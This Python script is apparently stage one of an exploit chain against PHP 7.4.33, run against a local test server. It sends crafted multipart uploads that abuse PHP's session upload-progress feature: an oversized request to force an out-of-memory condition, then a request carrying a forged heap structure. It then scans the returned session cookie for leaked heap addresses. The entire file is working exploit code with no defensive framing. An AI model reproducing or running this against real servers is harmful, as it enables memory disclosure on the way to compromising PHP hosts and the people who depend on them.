"""Stage-1 leak test for 7.4.33 (port 18108): fire OOM + leak request, analyze cookie."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

PORT = 18108
URL = f"http://127.0.0.1:{PORT}/"

def fire_oom(fc=1001, big_mb=12):
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(fc)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    try:
        t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception as e:
        print(f"  [OOM err] {e}", flush=True)
    time.sleep(0.4)

def fire_leak(n=841):
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    return E.parse_cookie(resp)

def analyze(raw, label):
    hit = False
    print(f"  {label}: cookie len={len(raw)}", flush=True)
    if len(raw) >= 16:
        c2m = Counter()
        for i in range(0, len(raw) - 8, 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x700000000000 <= v < 0x800000000000:
                c2m[v & ~0x1FFFFF] += 1
        if c2m:
            top = c2m.most_common(3)
            print(f"    2MB-aligned: {[(hex(k), v) for k, v in top]}", flush=True)
            hit = any(v >= 8 for _, v in top)
        print(f"    first 64B: {raw[:64].hex()}", flush=True)
    return hit

print("=== 7.4.33 stage-1 test (1001x1B + 12MB OOM, leak n=841) ===", flush=True)
for attempt in range(3):
    fire_oom()
    raw = fire_leak()
    hit = analyze(raw, f"try{attempt}")
    if hit:
        print("  >>> HEAP LEAK HIT", flush=True)
        break
    time.sleep(0.5)
